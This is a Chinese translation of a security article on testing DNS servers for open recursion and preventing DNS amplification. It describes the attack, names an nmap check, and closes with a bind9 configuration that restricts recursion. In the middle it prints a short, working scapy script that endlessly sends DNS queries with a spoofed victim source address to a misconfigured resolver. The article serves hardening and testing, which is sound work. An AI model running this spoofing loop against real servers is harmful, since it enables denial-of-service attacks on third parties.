> 原文链接: https://www.anquanke.com//post/id/83245 


# 测试DNS区域递归漏洞以及避免DNS放大攻击


                                阅读量   
                                **170893**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[https://isc.sans.edu/forums/diary/Testing+for+DNS+recursion+and+avoiding+being+part+of+DNS+amplification+attacks/20567/](https://isc.sans.edu/forums/diary/Testing+for+DNS+recursion+and+avoiding+being+part+of+DNS+amplification+attacks/20567/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01a635161d550c4aa1.jpg)](https://p4.ssl.qhimg.com/t01a635161d550c4aa1.jpg)

       尽管专家提醒过很多次，但仍然有非常多的DNS服务器允许递归解析到外网的设备，这一点可以被用来进行DNS放大攻击。

<br>

       那么怎样攻击呢？通常，攻击者使用僵尸网络向受害者的IP地址发送一个伪造的DNS请求，错误设置的DNS应答会使数据包被发送到受害者的IP地址，从而导致分布式拒绝服务攻击（DDoS）。

 

       怎样测试你的DNS设备是否允许来自外部的递归解析呢？你可以使用这个叫dns-recursion 的nmap脚本：



[![](https://p3.ssl.qhimg.com/t01e1aab07b97122eeb.png)](https://p3.ssl.qhimg.com/t01e1aab07b97122eeb.png)

       如果它没有被启用，你只会得到一个开放端口的指示：

 [![](https://p0.ssl.qhimg.com/t017e7a1957a3156593.png)](https://p0.ssl.qhimg.com/t017e7a1957a3156593.png)

 

       这个攻击是怎么运作的？我们来看下面的示意图：

[![](https://p1.ssl.qhimg.com/t012887091628fbea8b.jpg)](https://p1.ssl.qhimg.com/t012887091628fbea8b.jpg)

 

       攻击的POC可以很容易地用如下的scapy脚本被执行，由攻击者决定是否执行它：

```
#!/usr/bin/python
from scapy.all import *
victimIP = raw_input("Please enter the IP address for the victim: ")
dnsIP = raw_input("Please enter the IP address for the misconfigured DNS: ")
while True:
        send(IP(dst=dnsIP,src=victimIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com")),verbose=0)
```



       我把这个脚本命名为dnscapy.py。当它执行时：

 

[![](https://p1.ssl.qhimg.com/t0166f2ba9933ca0e88.png)](https://p1.ssl.qhimg.com/t0166f2ba9933ca0e88.png)

 

       在受害者那边得到如下数据包：

[![](https://p2.ssl.qhimg.com/t013d9f592005f9d446.png)](https://p2.ssl.qhimg.com/t013d9f592005f9d446.png)

 

       怎样避免这种攻击呢？如果你正在使用bind9，那么把下面这些加入到全局选项。假设你的企业网络是10.1.1.0/24 和10.1.2.0/24：

```
acl recursiononly `{` 10.1.1.0/24; 10.1.2.0/24; `}`;
options `{`
  allow-query `{` any; `}`;
  allow-recursion `{` recursiononly; `}`;
`}`;
```




